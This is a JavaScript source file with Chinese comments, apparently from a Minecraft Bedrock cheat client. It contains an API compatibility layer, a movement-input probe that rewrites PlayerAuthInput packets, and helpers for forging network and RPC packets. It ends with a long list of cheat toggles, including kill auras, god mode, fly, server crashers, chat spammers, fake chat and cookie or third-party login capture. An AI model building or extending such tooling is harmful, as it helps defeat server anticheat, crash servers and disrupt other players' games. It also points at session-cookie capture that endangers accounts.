        const v20 = Number(view.getFloat32(20, true));
        const v24 = Number(view.getFloat32(24, true));
        if (!isFinite(v20) || !isFinite(v24)) return;
        if ((Math.abs(v20) + Math.abs(v24)) < 1e-4) return;      // 没有移动输入：无从补偿
        const d = Number(dyawDeg);
        if (!isFinite(d) || Math.abs(d) < 1e-6) return;          // Δ=0：恒等变换
        const r = d * Math.PI / 180;
        const c = Math.cos(r), sn = Math.sin(r);
        view.setFloat32(20, v20 * c + v24 * sn, true);
        view.setFloat32(24, v24 * c - v20 * sn, true);
    } catch (e) { }
}

/* —— 移动输入探针（第 37 轮，#36 的四组读数实验）——
   目的：钉死 PlayerAuthInput 里 offset 20/24 两个分量的语义（谁是 forward、
   谁是 strafe）与旋转方向的符号。r17 的 TU_FixMove 正是栽在这三件事没验证，
   于是 #18 出现「走位偏/阻力」时无法判断到底是公式错还是思路错。

   采集内容（只记「有移动输入」的 144 包）：
       tick / 真实 yaw / pitch / (v20, v24) / 模长 / atan2(v20,v24) / 世界速度方向
   同 tick 只记一个包；输入方向与视角都没变就不重复记（一次按键 = 一行）；
   视角转动超过 5° 自动插一行分隔。

   操作（第 38 轮）：先关掉杀戮光环 / 大陀螺 / 自动搭路（它们会写实体朝向与包朝向，
   让 yaw 不再是真实视角）。找空旷平地站定、视角朝一个方向不动，依次
   只按 W、只按 A、只按 D、只按 S，每个方向走 3 秒，中间松开停一下；
   然后原地把视角转过约 90°，重复这四个方向。结果在 resources/TimeUnity/MoveProbe.txt。
   第 38 轮的补测数据已经用它把公式钉死了（见文档 #38），所以**默认关**；
   以后要复查走位/输入问题，把下面开关改回 true 重放即可。 */
/* 第 41 轮重新打开：做「覆盖前 vs 覆盖后」的成对采样，判定补偿有没有被采纳。
   结论拿到后再关掉。 */
const TU_MoveProbe = true;

function TU_ProbeWrite(line) {
    const p = _app.getResource() + "/TimeUnity/MoveProbe.txt";
    try {
        if (!globalThis.TU_ProbeInit) {                  // 每次脚本加载重置文件
            globalThis.TU_ProbeInit = true;
            _fs.write(p, "TimeUnity 移动输入探针（BEFORE=覆盖前 / AFTER=覆盖后）\n");
        }
        _fs.write(p, (_fs.exists(p) ? _fs.read(p) : "") + line);
    } catch (e) {
        try { _minecraft.clientMessage("§e[TU探针] " + line.replace(/\n/g, " ")); } catch (e2) { }
    }
}

/* 覆盖**之后**的采样。与 BEFORE 成对看就能判定：
     · y4 变了 → 覆盖走到了；没变 → 这个 tick 压根没覆盖；
     · (v20,v24) 变了 → 补偿生效；
     · 再对照 `世界=` 与包内值 → 服务端/客户端采纳的是哪一份输入。 */
function TU_ProbeAfter(view, tag) {
    if (!TU_MoveProbe) return;
    try {
        const v20 = Number(view.getFloat32(20, true));
        const v24 = Number(view.getFloat32(24, true));
        const mag = Math.sqrt(v20 * v20 + v24 * v24);
        if (!isFinite(mag) || mag < 0.05) return;        // 只看带移动输入的包
        const tick = Number(globalThis.TU_TickNo) || 0;
        if (tick === Number(globalThis.TU_ProbeAfterTick)) return;
        globalThis.TU_ProbeAfterTick = tick;
        let er = null;
        try { er = getEntityRot(self_id); } catch (e) { }
        const mvx = Number(self_motion && self_motion.x) || 0;
        const mvz = Number(self_motion && self_motion.z) || 0;
        TU_ProbeWrite("AFTER t=" + tick + " " + tag
            + " p0=" + Number(view.getFloat32(0, true)).toFixed(1)
            + " y4=" + Number(view.getFloat32(4, true)).toFixed(1)
            + " h28=" + Number(view.getFloat32(28, true)).toFixed(1)
            + " v20=" + v20.toFixed(3) + " v24=" + v24.toFixed(3)
            + " 实体=" + (er && isFinite(er.yaw) ? Number(er.yaw).toFixed(1) : "?")
            + " 世界=" + mvx.toFixed(2) + "," + mvz.toFixed(2) + "\n");
    } catch (e) { }
}

/* MovePlayer(19) 的采样：记录它实际发出去的朝向（以及身体有没有被覆盖）。 */
function TU_ProbeAfter19(view, rotOff, full) {
    if (!TU_MoveProbe) return;
    try {
        const tick = Number(globalThis.TU_TickNo) || 0;
        if (tick - (Number(globalThis.TU_Probe19Tick) || -999) < 5) return;
        globalThis.TU_Probe19Tick = tick;
        const mvx = Number(self_motion && self_motion.x) || 0;
        const mvz = Number(self_motion && self_motion.z) || 0;
        TU_ProbeWrite("AFTER19 t=" + tick
            + " p=" + Number(view.getFloat32(rotOff, true)).toFixed(1)
            + " y=" + Number(view.getFloat32(rotOff + 4, true)).toFixed(1)
            + " h=" + Number(view.getFloat32(rotOff + 8, true)).toFixed(1)
            + " 身体覆盖=" + (full ? "是" : "否")
            + " 世界=" + mvx.toFixed(2) + "," + mvz.toFixed(2) + "\n");
    } catch (e) { }
}

function TU_ProbeMove(data) {
    try {
        if (!data || typeof data.byteLength !== "number" || data.byteLength < 32) return;
        const view = (data instanceof ArrayBuffer)
            ? new DataView(data)
            : new DataView(data.buffer, data.byteOffset || 0, data.byteLength);
        const vx = Number(view.getFloat32(20, true));
        const vz = Number(view.getFloat32(24, true));
        const mag = Math.sqrt(vx * vx + vz * vz);
        if (!isFinite(mag) || mag < 0.05) return;          // 没有移动输入：不记
        const tick = Number(globalThis.TU_TickNo) || 0;
        const yawReal = Number(view.getFloat32(4, true));
        if (!isFinite(yawReal)) return;
        const ang = Math.atan2(vx, vz) * 180 / Math.PI;
        /* 采样策略（第 38 轮改）：原来只在「输入方向或视角变化」时记，稳定行走段
           几乎没有连续样本（第 37 轮 122 条里横移主导的只有 11 条、还都是过渡值）。
           现在：输入方向突变(≥30°)立刻记，否则每 5 tick 固定记一条。 */
        const lastA = globalThis.TU_ProbeA;
        let need = (lastA === undefined);
        if (!need) {
            let da = Math.abs(ang - lastA); if (da > 180) da = 360 - da;
            need = (da >= 30);
        }
        if (!need && (tick - (Number(globalThis.TU_ProbeTick) || -999)) < 5) return;
        globalThis.TU_ProbeTick = tick;
        globalThis.TU_ProbeA = ang;
        let line = "";
        const prevY = globalThis.TU_ProbeLastY;
        if (prevY === undefined) {
            line += "== 起始视角 yaw=" + yawReal.toFixed(1) + " ==\n";
        } else {
            let dY = Math.abs(yawReal - prevY); if (dY > 180) dY = 360 - dY;
            if (dY > 5) line += "== 视角转为 yaw=" + yawReal.toFixed(1) + " ==\n";
        }
        globalThis.TU_ProbeLastY = yawReal;
        const mvx = Number(self_motion && self_motion.x) || 0;
        const mvz = Number(self_motion && self_motion.z) || 0;
        /* 本地实体朝向：与包里的 yaw 差得多 → 这条的 yaw 被脚本写过（第 37 轮
           t=2341~2343 那种相邻 tick 跳 80° 的段），分析时直接剔除。 */
        let er = null;
        try { er = getEntityRot(self_id); } catch (e) { }
        TU_ProbeWrite(line
            + "t=" + tick + " yaw=" + yawReal.toFixed(1)
            + " pitch=" + Number(view.getFloat32(0, true)).toFixed(1)
            + " 实体=" + (er && isFinite(er.yaw) ? Number(er.yaw).toFixed(1) : "?")
            + " v20=" + vx.toFixed(3) + " v24=" + vz.toFixed(3)
            + " |v|=" + mag.toFixed(3) + " atan2(v20,v24)=" + ang.toFixed(1)
            + " 世界=" + mvx.toFixed(2) + "," + mvz.toFixed(2) + "\n");
    } catch (e) { }
}

/* 相机「脱离 / 恢复」的幂等封装。
   脚本只在第三人称让相机脱离玩家（否则改实体朝向会把玩家自己的画面一起拉走），
   恢复必须配套；原实现在「没有目标」时每 tick 调一次 resetCamera，会让相机状态
   反复重置。用标记保证只在真正脱离过之后恢复一次。 */
function TU_DepartCamera() {
    if (globalThis.TU_CamDeparted) return true;
    try { _camera.departCamera(); globalThis.TU_CamDeparted = true; return true; } catch (e) { return false; }
}

function TU_ResetCamera() {
    if (!globalThis.TU_CamDeparted) return false;
    try { _camera.resetCamera(); } catch (e) { }
    globalThis.TU_CamDeparted = false;
    return true;
}

/* 脚本加载时主动把相机复位一次。
   相机是**引擎级状态**：上一次若是「重载脚本」而不是「退出脚本」，Tool_Exit() 里的
   resetCamera 不会执行，脱离状态就会残留到下一次加载 —— 表现是第三人称下滑动鼠标
   自己的头部不跟转、相机能绕到正面看到自己的脸。代码里「自由视角」没有任何持久化，
   所以这里复位一次即可保证从干净状态开始（想用自由视角，加载后手动开一次）。 */
try { _camera.resetCamera(); } catch (e) { }

/* v1 的 setLocalPlayerTurn(pitch, yaw)：设置本地玩家视角转向角度
   （v2 对应 LocalPlayer.setTurn(rotation)）。
   这是文档里唯一属于「设置玩家转向」的接口 —— 引擎会把它当作玩家自己的视角
   接受；而 setRotation / setYBodyRotation / setYHeadRotation 是改实体状态，
   会与客户端每帧的输入驱动更新互相争夺（表现为抽搐或被覆盖回原值）。 */
function setLocalPlayerTurn(pitch, yaw) {
    try {
        const p = _localPlayer();
        if (!p) return false;
        if (typeof p.setTurn === "function") {
            p.setTurn({ pitch: pitch, yaw: yaw });
            return true;
        }
    } catch (e) { }
    return false;
}

function setEntityFlag(id, flag, value) {
    const a = _localOrActor(id);
    if (!a) return false;
    try { a.setStatusFlag(flag, value); return true; } catch (e) { return false; }
}

function setEntityAttribute(id, name, value) {
    const a = _localOrActor(id);
    if (!a) return false;
    try { a.setAttribute(name, value); return true; } catch (e) { return false; }
}

function setEntitySize(id, size) {
    const a = _localOrActor(id);
    if (!a) return false;
    try { a.setSize(size); return true; } catch (e) { return false; }
}

function setEntityEffect(id, effect) {
    const a = _localOrActor(id);
    if (!a) return false;
    try { a.addEffect(effect); return true; } catch (e) { return false; }
}

function removeEntityEffect(id, effectId) {
    const a = _actor(id);
    if (!a) return false;
    try { return !!a.removeEffect(effectId); } catch (e) { return false; }
}

/* ---------- 本地玩家 ---------- */

function getLocalPlayerUniqueID() {
    const p = _localPlayer();
    try { return p ? p.getUniqueID() : ""; } catch (e) { return ""; }
}

function getLocalPlayerRuntimeID() {
    const p = _localPlayer();
    try { return p ? p.getRuntimeID() : ""; } catch (e) { return ""; }
}

function getPlayerInventoryItem(id, slot) {
    const p = _localPlayer();
    try { return p ? _itemToV1Nbt(p.getInventoryItem(slot)) : ""; } catch (e) { return ""; }
}

function getPlayerInventorySize(id) {
    const p = _localPlayer();
    try { return p ? p.getInventorySize() : 0; } catch (e) { return 0; }
}

function getPlayerSelectItemSlot(id) {
    const p = _localPlayer();
    try { return p ? p.getSelectItemSlot() : 0; } catch (e) { return 0; }
}

function getPlayerHotBarSize(id) {
    const p = _localPlayer();
    try { return p ? p.getHotBarSize() : 0; } catch (e) { return 0; }
}

function getPlayerArmorItem(id, slot) {
    const p = _localPlayer();
    try { return p ? _itemToV1Nbt(p.getArmorItem(slot)) : ""; } catch (e) { return ""; }
}

function getPlayerBlockDestroyTime(id, slot, blockName) {
    const p = _localPlayer();
    try { return p ? p.getBlockDestroyTime(slot, blockName) : 0; } catch (e) { return 0; }
}

function getPlayerAbilities(id) {
    const p = _localPlayer();
    try { return p ? p.getAbilities() : null; } catch (e) { return null; }
}

function setPlayerAbilities(id, abilities) {
    const p = _localPlayer();
    try { if (p) p.setAbilities(abilities); } catch (e) { }
}

function selectPlayerInventorySlot(id, slot) {
    const p = _localPlayer();
    try { if (p) p.setSelectItemSlot(slot); } catch (e) { }
}

// v1 的额外两个参数在新 API 中已不存在
function dropPlayerInventorySlot(id, slot) {
    const p = _localPlayer();
    try { return p ? p.dropInventorySlot(slot) : false; } catch (e) { return false; }
}

function deleteContainer() {
    const p = _localPlayer();
    try { if (p) p.deleteContainerManager(); } catch (e) { }
}

function openInventory() {
    const p = _localPlayer();
    try { if (p) p.openInventory(); } catch (e) { }
}

function closeInventory() {
    const p = _localPlayer();
    try { if (p) p.closeInventory(); } catch (e) { }
}

function moveInventoryItem(fromSlot, toSlot) {
    const p = _localPlayer();
    try { if (p) p.moveInventoryItem(fromSlot, toSlot); } catch (e) { }
}

function moveContainerItem(items) {
    const p = _localPlayer();
    try { if (p) p.moveContainerItem(items); } catch (e) { }
}

function swapContainerItem(items) {
    const p = _localPlayer();
    try { if (p) p.swapContainerItem(items); } catch (e) { }
}

function attackEntity(id, action) {
    const p = _localPlayer();
    if (!p) return false;
    const t = _actor(id);
    if (!t) return false;
    try {
        p.attack(t);
        if (action) { try { p.swing(); } catch (e) { } }
        return true;
    } catch (e) { return false; }
}

function interactEntity(id) {
    const p = _localPlayer();
    if (!p) return false;
    const t = _actor(id);
    if (!t) return false;
    try { return p.interact(t); } catch (e) { return false; }
}

/* 找目标格 (x,y,z) 旁边可用于附着的实体方块，返回支撑方块坐标 + 点击面。
   面编号:下=1 西=5 东=4 北=3 南=2 上=0 */
function _findPlaceSupport(x, y, z) {
    const offs = [[0, -1, 0, 1], [-1, 0, 0, 5], [1, 0, 0, 4], [0, 0, -1, 3], [0, 0, 1, 2], [0, 1, 0, 0]];
    for (let i = 0; i < offs.length; i++) {
        const o = offs[i];
        const nx = x + o[0], ny = y + o[1], nz = z + o[2];
        const nb = getBlock(nx, ny, nz);
        if (nb && nb.namespace && nb.namespace !== "minecraft:air" &&
            nb.namespace !== "minecraft:water" && nb.namespace !== "minecraft:flowing_water" && nb.id !== 0) {
            return { x: nx, y: ny, z: nz, face: o[3] };
        }
    }
    return null;
}

/* v2 的 player.buildBlock(pos, face) 里，pos 是「被点击的方块」而 face 是点击的面，
   与 v1 全局 buildBlock(id, x, y, z, face) 把 pos 当目标格的语义不同。
   脚本主体传的都是目标格，这里统一换算成相邻支撑方块 + 面后再交给引擎。
 */
function buildBlock(id, x, y, z, face) {
    const p = _localPlayer();
    if (!p) return false;
    try {
        const sup = _findPlaceSupport(x, y, z);
        if (!sup) return false;
        return !!p.buildBlock({ x: sup.x, y: sup.y, z: sup.z }, sup.face);
    } catch (e) { return false; }
}

function swingArm() {
    const p = _localPlayer();
    try { if (p) p.swing(); } catch (e) { }
}

function playerJump() {
    const p = _localPlayer();
    try { if (p) p.jumpFromGround(); } catch (e) { }
}

/* ---------- 摄像机（参数由散列改为对象） ---------- */

function setCameraAnchor(x, y, z) {
    try { _camera.setAnchor({ x: x, y: y, z: z }); } catch (e) { }
}

function setCameraOffset(x, y, z) {
    try { _camera.setOffset({ x: x, y: y, z: z }); } catch (e) { }
}

/* ---------- 世界数据 / 结构 / 粒子 ---------- */

function getWorldData() {
    const w = _level();
    if (!w) return {};
    try {
        return {
            difficulty: w.getDifficulty(),
            flatWorldLayers: w.getFlatWorldLayers(),
            forceGameType: w.getForceGameType(),
            gameType: w.getGameType(),
            levelName: w.getLevelName(),
            randomSeed: w.getRandomSeed(),
            time: w.getTime(),
            lightningLevel: w.getLightningLevel(),
            lightningTime: w.getLightningTime(),
            rainLevel: w.getRainLevel(),
            rainTime: w.getRainTime(),
            randomTickSpeed: w.getRandomTickSpeed()
        };
    } catch (e) { return {}; }
}

function setWorldData(data) {
    const w = _level();
    if (!w || !data) return false;
    try {
        if (typeof data.time === "number") w.setTime(BigInt(Math.floor(data.time)));
        if (typeof data.rainTime === "number") w.setRainTime(data.rainTime);
        if (typeof data.rainLevel === "number") w.setRainLevel(data.rainLevel);
        if (typeof data.difficulty === "number") w.setDifficulty(data.difficulty);
        if (typeof data.gameType === "number") w.setGameType(data.gameType);
        if (typeof data.forceGameType === "boolean") w.setForceGameType(data.forceGameType);
        if (typeof data.levelName === "string") w.setLevelName(data.levelName);
        if (typeof data.lightningLevel === "number") w.setLightningLevel(data.lightningLevel);
        if (typeof data.lightningTime === "number") w.setLightningTime(data.lightningTime);
        if (typeof data.randomTickSpeed === "number") w.setRandomTickSpeed(data.randomTickSpeed);
        if (typeof data.flatWorldLayers === "string") w.setFlatWorldLayers(data.flatWorldLayers);
        return true;
    } catch (e) { return false; }
}

function findStructure(x, y, z, name) {
    const w = _level();
    if (!w) return { state: false };
    try {
        const r = w.findStructure(name, { x: x, y: y, z: z });
        if (!r) return { state: false };
        return { state: true, x: r.x, y: r.y, z: r.z };
    } catch (e) { return { state: false }; }
}

function addParticle(type, start_x, start_y, start_z, offset_x, offset_y, offset_z, size, animation) {
    const w = _level();
    if (!w) return false;
    try {
        w.addParticle({
            type: type,
            pos: { x: start_x, y: start_y, z: start_z },
            dir: { x: offset_x - start_x, y: offset_y - start_y, z: offset_z - start_z },
            data: size,
            global: !!animation
        });
        return true;
    } catch (e) { return false; }
}

/* ---------- HUD：ArrayList / Text / Shape（v2 为实例对象，需登记管理） ---------- */

const _arrayListItems = {};
function addCustomArrayList(functionId, longName, shortName, enabled) {
    try {
        let item = _arrayListItems[functionId];
        if (!item) {
            item = new _gui.ArrayList({
                function: functionId,
                name: longName,
                shortName: shortName,
                enabled: !!enabled
            });
            _arrayListItems[functionId] = item;
        } else {
            item.name = longName;
            item.shortName = shortName;
            item.enabled = !!enabled;
        }
        return true;
    } catch (e) { return false; }
}

function removeCustomArrayList(functionId) {
    const item = _arrayListItems[functionId];
    if (!item) return false;
    try { item.remove(); } catch (e) { }
    delete _arrayListItems[functionId];
    return true;
}

const _textItems = {};
let _textIdSeq = 0;
function createText(content, alignment, x, y) {
    try {
        const t = new _gui.Text({
            content: content,
            alignment: alignment,
            position: { x: x, y: y },
            color: { r: 1, g: 1, b: 1, a: 1 },
            scale: 1
        });
        const id = _textIdSeq++;
        _textItems[id] = t;
        return id;
    } catch (e) { return -1; }
}

function updateTextContent(id, content) {
    const t = _textItems[id];
    if (!t) return;
    try { t.content = content; } catch (e) { }
}

function updateTextPosition(id, x, y) {
    const t = _textItems[id];
    if (!t) return;
    try { t.position = { x: x, y: y }; } catch (e) { }
}

function updateTextColor(id, r, g, b, a) {
    const t = _textItems[id];
    if (!t) return;
    try { t.color = { r: r, g: g, b: b, a: a }; } catch (e) { }
}

function updateTextScale(id, scale) {
    const t = _textItems[id];
    if (!t) return;
    try { t.scale = scale; } catch (e) { }
}

function removeText(id) {
    const t = _textItems[id];
    if (!t) return;
    try { t.remove(); } catch (e) { }
    delete _textItems[id];
}

const _shapeItems = {};
let _shapeIdSeq = 0;
function createShape(options) {
    try {
        const o = options || {};
        const s = new _Shape({
            visible: o.visible !== false,
            isFill: !!o.isFill,
            lower: o.lower,
            upper: o.upper,
            color: o.color
        });
        const id = _shapeIdSeq++;
        _shapeItems[id] = s;
        return id;
    } catch (e) { return -1; }
}

function updateShape(id, options) {
    const s = _shapeItems[id];
    if (!s || !options) return false;
    try {
        if (options.visible !== undefined) s.visible = options.visible;
        if (options.isFill !== undefined) s.isFill = options.isFill;
        if (options.lower) s.lower = options.lower;
        if (options.upper) s.upper = options.upper;
        if (options.color) s.color = options.color;
        return true;
    } catch (e) { return false; }
}

function removeShape(id) {
    const s = _shapeItems[id];
    if (!s) return false;
    try { s.remove(); } catch (e) { }
    delete _shapeItems[id];
    return true;
}

function getScreenSizeData() {
    try {
        const s = _gui.getSizeData();
        return {
            deviceWidth: s.totalScreenSizeWidth,
            deviceHeight: s.totalScreenSizeHeight,
            screenWidth: (s.clientUIScreenWidth !== undefined ? s.clientUIScreenWidth : s.clientScreenWidth),
            screenHeight: (s.clientUIScreenHeight !== undefined ? s.clientUIScreenHeight : s.clientScreenHeight)
        };
    } catch (e) {
        return { deviceWidth: 0, deviceHeight: 0, screenWidth: 0, screenHeight: 0 };
    }
}

/* ---------- 数据包 ---------- */

class _CompatPacket {
    constructor() { this._p = new _packet.Packet(); }
    writeByte(v) { this._p.writeByte(v); return this; }
    writeUnsignedChar(v) { this._p.writeByte((isFinite(v) ? Math.round(v) : 0) & 0xFF); return this; }
    writeBool(v) { this._p.writeBool(v); return this; }
    writeUnsignedShort(v) { this._p.writeUnsignedShort(v); return this; }
    writeSignedShort(v) { this._p.writeSignedShort(v); return this; }
    writeUnsignedInt(v) { this._p.writeUnsignedInt(v); return this; }
    writeSignedInt(v) { this._p.writeSignedInt(v); return this; }
    writeUnsignedInt64(v) { this._p.writeUnsignedInt64(v); return this; }
    writeSignedInt64(v) { this._p.writeSignedInt64(v); return this; }
    writeVarInt(v) { this._p.writeVarInt(v); return this; }
    writeVarInt64(v) { this._p.writeVarInt64(v); return this; }
    writeFloat(v) { this._p.writeFloat(v); return this; }
    writeDouble(v) { this._p.writeDouble(v); return this; }
    writeString(v) { this._p.writeString(v); return this; }
    writeBytes(v) { this._p.buffer = _sanitizePacketBytes(v); return this; }
    send(id) { return this._p.sendToServer(id); }
    sendToLocal(id) { return this._p.sendToLocal(id); }
    destroy() { /* v2 Packet 无需显式销毁 */ }
}
const Packet = _CompatPacket;

/* 发送前的字节清洗：包体里的任何非有限数值（NaN/Infinity）或越界值都会以非法
   字节进入 native 层，属于「脚本一发包就把游戏带崩」的典型来源。这里统一压回
   合法字节区间；非数组（如引擎自有缓冲）原样返回。 */
function _sanitizePacketBytes(data) {
    if (!data || typeof data.length !== "number") return data;
    try {
        for (let i = 0; i < data.length; i++) {
            const v = Number(data[i]);
            if (!isFinite(v)) data[i] = 0;
            else if (v < 0 || v > 255) data[i] = Math.round(v) & 0xFF;
            else data[i] = Math.round(v);
        }
    } catch (e) { }
    return data;
}

function sendNetworkPacket(id, data) {
    try {
        const p = new _packet.Packet();
        p.buffer = _sanitizePacketBytes(data);
        return p.sendToServer(id);
    } catch (e) { return false; }
}

function sendLocalPacket(id, data) {
    try {
        const p = new _packet.Packet();
        p.buffer = _sanitizePacketBytes(data);
        return p.sendToLocal(id);
    } catch (e) { return false; }
}

function sendCommandRequest(command) {
    try { return _packet.sendCommandRequestPacket({ command: command }); }
    catch (e) { return false; }
}

/* v1 的 PlayerAuthInput / PlayerAction 字段名与 v2 不同：
   v1: { pos, motion, ... }        v2: { pos, posDelta, delta, ... }
   v1: { id, pos, type, value }    v2: { pos, resultPos, face, action }
   这里做「原字段透传 + 常见别名补全」，避免字段被静默丢弃。 */

function sendPlayerAuthInput(options) {
    try {
        const o = options || {};
        const out = {};
        for (const k in o) out[k] = o[k];
        if (out.posDelta === undefined && o.motion !== undefined) out.posDelta = o.motion;
        if (out.delta === undefined && o.motion !== undefined) out.delta = o.motion;
        if (out.analogMoveVector === undefined && o.analogMove !== undefined) out.analogMoveVector = o.analogMove;
        if (out.moveVector === undefined && o.moveVec !== undefined) out.moveVector = o.moveVec;
        if (out.rawMoveVector === undefined && o.rawMoveVec !== undefined) out.rawMoveVector = o.rawMoveVec;
        return _packet.sendPlayerAuthInputPacket(out);
    } catch (e) { return false; }
}

function sendPlayerAction(options) {
    try {
        const o = options || {};
        const out = {};
        for (const k in o) out[k] = o[k];
        if (out.action === undefined && o.type !== undefined) out.action = o.type;
        if (out.face === undefined) {
            if (o.value !== undefined) out.face = o.value;
            else if (o.actionType !== undefined) out.face = o.actionType;
        }
        if (out.resultPos === undefined) out.resultPos = o.resultPos || o.pos;
        return _packet.sendPlayerActionPacket(out);
    } catch (e) { return false; }
}

/* ---------- 网络（v2 无 game_api 专用接口，退回通用 https） ---------- */

function curl_get_game_api(url, callback) {
    try { _https.get(url, {}, callback); } catch (e) { }
}

function curl_post_game_api(url, body, callback) {
    try { _https.post(url, {}, body, callback); } catch (e) { }
}

/* ---------- 音频（v2 需要先创建 Sound 对象） ---------- */

function playSound(source) {
    try {
        if (!_media) return;
        const api = (typeof _media.playSound === "function")
            ? _media
            : (_media.system || _media.media || _media);
        const snd = api.createSound(source);
        api.playSound(snd);
    } catch (e) { }
}

/* v2 文档里 sendPyRpcPacket 的 data 是 string | ArrayBuffer；脚本原来直接塞
   hexToUint8Array() 的 Uint8Array。优先给 ArrayBuffer，失败再退回原类型 ——
   那个 RPC 是服务端权威移动模式下的攻击补偿，发不出去就会「打不动」。 */
function TU_SendPyRpc(id, u8) {
    try { if (_packet.sendPyRpcPacket(id, u8.buffer)) return true; } catch (e) { }
    try { if (_packet.sendPyRpcPacket(id, u8)) return true; } catch (e) { }
    return false;
}

/* ---------- 原生模块调用 ---------- */

/* v1: callModule(moduleId: number, json)
   v2: app.callModule(tag: string, json)
   v2 的 tag 必须是字符串，否则引擎抛 "Invalid arguments"（并中断脚本）。
   这里统一把 tag 转为字符串；两种形式都失败时静默返回 false，不向上抛异常。 */
function callModule(tag, json) {
    const payload = (typeof json === "string") ? json : JSON.stringify(json);
    try { return _app.callModule(String(tag), payload); } catch (e) { }
    try { return _app.callModule(tag, payload); } catch (e) { }
    return false;
}

/* ---------- 线程 ---------- */

function thread(fn, ms) {
    return setTimeout(fn, ms || 0);
}


let InfiniteAura_Enabled = false;
let InfiniteAura_Group_Enabled = false;
let InfiniteAura_Monomer_Enabled = false;
let InfiniteAura_Entity_Enabled = false;
let InfiniteAura_WhiteList_Enabled = false;
let InfiniteAura_BlackList_Enabled = false;
let NodeMode = false;
let GodMode_Enabled = false;
let MegaTop_Enabled = false;
let MegaTop_head = false;
let MegaTop_Headless = true;
let Structure_Enabled = false;
let ChestStealer_Enabled = false;
let LockPos = false;
let CircleMode = false;
let JsonMode = false;
let AutoBreak_Enabled = false;
let AntiStarve_Enabled = false;
let AntiInvis_Enabled = false;
let SuicideAura_Enabled = false;
let SetHand_Enabled = false;
let ColorChat_Enabled = false;
let AIChat_Enabled = false;
let AIChat_Think = false;
let AIChat_Whole = false;
let AIChat_Single = true;
let AIChat_Button = false;
let NoShake_Enabled = false;
let AntiLoot_Enabled = false;
let AntiFox_Enabled = false;
let CheckLogin = false;
let NoGrave_Enabled = false;
let AutoLoot_Enabled = false;
let DamageHUD_Enabled = false;
let Killnsult_Enabled = false;
let AutoRetaliate_Enabled = false;
let AutoRetaliate_Player = false;
let AutoRetaliate_Entity = false;
let ChatLock_Enabled = false;
let ChatLock_Whole = false;
let ChatLock_Attack = false;
let AutoDrop_Enabled = false;
let Spammer_Enabled = false;
let AntiGhost_Enabled = false;
let FakeChat_Enabled = false;
let Spammer_UseColor = false;
let SilentKill_Enabled = false;
let AntiHit_Enabled = false;
let CookieLogin = false;
let AttackParticle = false;
let InfiniteAura_TPClick = true;
let InfiniteAura_ReturnClick = true;
let InfiniteAura_swing = true;
let PacketDestroy_Enabled = false;
let BunnyHop = false;
let Hop = true;
let AttackSound = false;
let Fly = false;
let Fly_Snake = true
let Fly_Packet = true
let Swing = true;
let KillAura_Enabled = false;
let AntiBot = false;
let shouldDelete = true;
let AntiText = false;
let AutoTeam = false;
let check_armor = true;
let check_skin = true;
let AirHand = false;
let setCamera_Enabled = false;
let MoveCamera_Enabled = false;
let checkCollision = true;
let Scaffold_Enabled = false;
let Scaffold_LockY = true;
let KillAura_CutSword = true;
let Scaffold_AutoBuild = false;
let Scaffold_SilentMode = false;
let invManager_Enabled = false;
let AutoArmor = true;
let TeleMine_Enabled = false;
let CmdFile_Enabled = false;
let TickStop_Enabled = false;
let TermBase = false;
let NotMe = false;
let LowTP_Enabled = false;
let target_self = false;
let CoordHUD_Enabled = false;
let Timer_Enabled = false;
let Drop_Items = true;
let invManager_inventory = false;
let invManager_chest = false;
let AutoRC_Enabled = false;
let AutoIP = true;
let KillSound = false;
let BetaUser = false;
let Move_Weapon = true;
let LockNight_Enabled = false;
let AutoSprint_Enabled = false;
let Beacon_Packet_Enabled = false;
let Critical_Enabled = false;
let BJDFly_Enabled = false;
let CrystalAura_Enabled = false;
let CrystalAura_AttackEntity = false;
let CrystalAura_AttackCrystal = true;
let SpeedDestroy_Enabled = false;
let EnchantMod_Enabled = false;
let SaveCookie_Enabled = false;
let Spammer_PetName = false;
let Crasher_Enabled = false;
let SummonFox_Enabled = false;
let SummonFox_Speed = 1;
let AutoCrasher_Enabled = false;
let AttackESP_Enabled = false;
let BringTP_Enabled = false;
let KillAura_Mode_Player = true;
let KillAura_Mode_mob = false;
let KillAura_Atacked = false;
let InfiniteAura_Player_Enabled = true;
let MoveJump = false;
let Fly_Pos = false;
let Fly_Motion = true;
let PleaseForCommand = false;
let Critical_isAttack = false;
let Critical_isAttack2 = false;
let PacketSleep_Enabled = false;
let Sauth_4399Login = false;
let ModifyTime = false;
let ModifyRain = false;
let Replication_Enabled = false;
let Replication_Drop = false;
let Replication_Bypas = false;
let PyRpcTube = false;
let PyRpcTube_Send = true;
let PyRpcTube_Receive = false;
let PyRpcTube_Save = false;
let PyRpcTube_Tip = true;
let PyRpcTube_Cycle = false;
let WelCome_Enabled = false;
let KillAura_Transferred = false;
let Scaffold_Rescue = false;
let KillAura_ECAttack = false;
let Scaffold_BJDSpeed = false;
let KillAura_PacketRot = false;
let KillAura_silentRot = false;
let Scaffold_BypasEC = false;
let Scaffold_FakeBlock = false;
let DropCarriedItem_Enabled = false;
let KillAura_health = false;
let invManager_Silence = true;
let invManager_Flag = false;
let ChestStealer_Automatic = true;
let NoReceivePacket = false;
let Scaffold_MoveJump = false;
let AutoBox_Enabled = false;
let AttackInvisible = true;
let Blink_Enabled = false;
let KillAura_WhiteList_Enabled = false;
let KillAura_BlackList_Enabled = false;
let Drop_Bow = false;
let HYT_Config = false;
let BJD_Mode = false;
let JumpSpeed_Enabled = false;
let ServerChecker_Enabled = false;
let AutoTool_Enabled = false;
let BJD_Deputy_Enabled = false;
let AutoLoot_item = true;
let AutoLoot_xp_orb = false;
let BackTrack_Attack = false;
let BackTrack_Enabled = false;
let AntiVoid_Enabled = false;
let AntiVoid_Rebound = true;
let AntiVoid_Block = false;
let AutoDestroyBed_Enabled = false;
let InfiniteAura_ReturnPacket = false;
let NoOnlineKick_Enabled = false;
let Beacon_Packet_Block = true;
let FogRender_Enabled = false;
let ModuleTip_Enabled = true;
let ModuleTip_MessageTip = true;
let ModuleTip_GUITip = false;
let isDestroy = false;
let GodMode_RandomHeight = false;
let GodMode_Vertical = false;
let GodMode_PickUp = false;
let AutoGapple_Enabled = false;
let KillAura_NotCutSword = true;
let TransferPlayer_Enabled = false;
let ParticleBoom_Enabled = false;
let TransferPlayers_IsTP = false;
let Global_InfiniteAura_MenuOpen = false;
let Global_InfiniteAura_PlayerTP = false;
let ParticleBoom_MenuOpen = false;
let AntiAntiBot_Enabled = false;
let KillAura_SilentMode = true;
let AutoFood_Enabled = false;
let CampersAura_Enabled = false;
let InfiniteAura_PlayerAuthInput = false;
let AntiTP_Enabled = false;
